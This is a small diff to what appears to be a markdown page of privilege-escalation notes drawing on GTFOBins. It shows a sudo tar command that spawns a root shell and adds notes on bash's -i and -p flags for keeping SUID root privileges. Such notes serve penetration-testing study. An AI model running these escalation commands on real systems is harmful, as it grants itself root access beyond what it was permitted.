@@ -59,7 +59,10 @@ Example: you can only run `tar` using `sudo`. Run the command below from [GTFOBi
 $ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 ```
 
-> I'm adding [some extras here](gtfobins.md).
+> I'm adding [some extras here](gtfobins.md). Two small notes
+> 
+> * `/bin/bash -i`: start an interactive bash
+> * `/bin/bash -p`: do not drop privilege <small>(SUID, start the bash as root)</small>
 </div></div>
 
 <hr class="sep-both">
